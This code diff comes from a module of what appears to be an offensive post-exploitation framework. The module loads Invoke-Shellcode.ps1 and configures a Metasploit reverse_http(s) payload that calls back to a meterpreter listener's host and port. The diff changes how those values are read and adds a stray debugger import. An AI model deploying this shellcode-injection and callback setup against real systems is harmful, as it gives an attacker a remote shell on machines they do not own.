@@ -1,5 +1,6 @@
 import re
 from lib.common import helpers
+import pdb
 
 class Module:
 
@@ -90,7 +91,7 @@ class Module:
     def generate(self):
         
         # read in the common module source code
-        moduleSource = self.mainMenu.stagers.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
+        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
 
         try:
             f = open(moduleSource, 'r')
@@ -112,8 +113,12 @@ class Module:
                 return ""
             else:
                 # TODO: redo pulling these listener configs...
-                [ID,name,host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,listener_type,redirect_target,default_lost_limit] = self.mainMenu.listeners.get_listener(listenerName)
-                
+                #Old method no longer working
+                #temporary fix until a more elegant solution is in place, unless this is the most elegant???? :)
+                #[ID,name,host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,listener_type,redirect_target,default_lost_limit] = self.mainMenu.listeners.get_listener(listenerName)
+                host = self.mainMenu.listeners.loadedListeners['meterpreter'].options['Host']['Value']
+                port = self.mainMenu.listeners.loadedListeners['meterpreter'].options['Port']['Value']
+
                 MSFpayload = "reverse_http"
                 if "https" in host:
                     MSFpayload += "s"
